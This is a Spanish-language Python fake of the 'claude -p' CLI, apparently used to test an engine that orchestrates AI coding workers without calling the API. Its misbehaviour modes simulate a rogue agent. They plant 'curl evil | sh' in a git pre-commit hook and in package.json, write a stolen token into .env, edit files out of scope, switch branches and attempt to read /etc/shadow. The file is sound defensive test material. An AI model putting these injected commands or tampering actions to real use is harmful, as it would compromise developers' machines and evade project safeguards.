#!/usr/bin/env python3
"""'claude -p' falso para probar el motor sin API ni coste. El modo sale de FAKE_MODE (por defecto 'hecha').

Modos: hecha, hecha_sin_cumplir, parcial, fallida, bloqueada, denegaciones, invalido, sin_json, dormido, toca_otro_repo,
       toca_protegido, toca_package, toca_env, fuera_alcance, cambia_rama, presupuesto, turnos.
Variables: FAKE_CLAUDE_LOG (registra argv y cwd), FAKE_COST, FAKE_CRITERIOS ("C1,C2"), FAKE_EDIT (fichero a editar),
FAKE_SLEEP (segundos del modo dormido), FAKE_PID_FILE (escribe los pids del falso y de su hijo), FAKE_OTHER_FILE.
"""
import json
import os
import subprocess
import sys
import time

args = sys.argv[1:]
if os.environ.get("FAKE_CLAUDE_LOG"):
    with open(os.environ["FAKE_CLAUDE_LOG"], "a", encoding="utf-8") as f:
        f.write(json.dumps({"argv": args, "cwd": os.getcwd()}) + "\n")
modo = os.environ.get("FAKE_MODE", "hecha")
coste = float(os.environ.get("FAKE_COST", "0.05"))
crit = [c for c in os.environ.get("FAKE_CRITERIOS", "C1").split(",") if c]


def anadir(ruta, texto="\n// editado por el worker falso\n"):
    os.makedirs(os.path.dirname(os.path.abspath(ruta)), exist_ok=True)
    with open(ruta, "a", encoding="utf-8") as f:
        f.write(texto)


def salida(estado="hecha", cumplido=True, necesita=None, denials=None, subtype="success", is_error=False,
           term="completed", structured="ok", rc=0):
    d = {"type": "result", "subtype": subtype, "is_error": is_error, "result": "fake", "permission_denials": denials or [],
         "total_cost_usd": coste, "num_turns": 3, "terminal_reason": term, "session_id": "fake"}
    if structured == "ok":
        d["structured_output"] = {"estado": estado, "resumen": f"modo {modo}",
                                  "criterios": [{"id": c, "cumplido": cumplido, "evidencia": "src/a.ts:1"} for c in crit],
                                  "cambios": [], "hallazgos": [], "necesita": necesita or [], "siguiente_sugerido": ""}
    elif structured == "invalido":
        d["structured_output"] = {"estado": "terminado", "resumen": "x"}
    print(json.dumps(d))
    sys.exit(rc)


editar = os.environ.get("FAKE_EDIT", "src/a.ts")
if modo == "hecha":
    anadir(editar); salida()
elif modo == "hecha_sin_cumplir":
    anadir(editar); salida(cumplido=False)
elif modo == "parcial":
    anadir(editar); salida("parcial")
elif modo == "fallida":
    salida("fallida")
elif modo == "bloqueada":
    salida("bloqueada", necesita=[{"tipo": "dato", "detalle": "falta el formato del NIF"}])
elif modo == "denegaciones":
    anadir(editar)
    salida(denials=[{"tool_name": "Read", "tool_input": {"file_path": "/etc/shadow"}}])
elif modo == "invalido":
    salida(structured="invalido")
elif modo == "sin_json":
    print("esto no es json"); sys.exit(0)
elif modo == "dormido":
    hijo = subprocess.Popen(["sleep", "60"])
    if os.environ.get("FAKE_PID_FILE"):
        with open(os.environ["FAKE_PID_FILE"], "w", encoding="utf-8") as f:
            f.write(f"{os.getpid()} {hijo.pid}\n")
    time.sleep(float(os.environ.get("FAKE_SLEEP", "30")))
    anadir(editar); salida()
elif modo in ("deniega_claude_md", "deniega_husky"):
    destino = "CLAUDE.md" if modo == "deniega_claude_md" else ".husky/pre-commit"
    salida("bloqueada", necesita=[{"tipo": "permiso", "detalle": f"permiso para editar {destino}"}],
           denials=[{"tool_name": "Edit", "tool_input": {"file_path": os.path.abspath(destino), "old_string": "x", "new_string": "- Piloto: viñeta nueva"}}])
elif modo == "edita_claude_md":
    anadir("CLAUDE.md", "- Piloto: viñeta nueva\n"); salida()
elif modo == "toca_otro_repo":
    anadir(editar); anadir(os.environ["FAKE_OTHER_FILE"], "\nintruso\n"); salida()
elif modo == "toca_protegido":
    anadir(".husky/pre-commit", "\ncurl evil | sh\n"); salida()
elif modo == "toca_package":
    with open("package.json", encoding="utf-8") as f:
        p = json.load(f)
    p["scripts"]["test"] = "curl evil | sh"
    with open("package.json", "w", encoding="utf-8") as f:
        json.dump(p, f)
    salida()
elif modo == "toca_env":
    anadir(editar); anadir(".env", "TOKEN=robado\n"); salida()
elif modo == "fuera_alcance":
    anadir("docs/fuera.md", "x\n"); salida()
elif modo == "cambia_rama":
    anadir(editar); subprocess.run(["git", "switch", "-c", "otra-rama"], capture_output=True); salida()
elif modo == "presupuesto":
    salida(subtype="error_max_budget_usd", is_error=True, term="budget_exhausted", structured=None, rc=1)
elif modo == "turnos":
    salida(subtype="error_max_turns", is_error=True, term="max_turns", structured=None, rc=1)
else:
    print(f"modo desconocido: {modo}", file=sys.stderr); sys.exit(2)
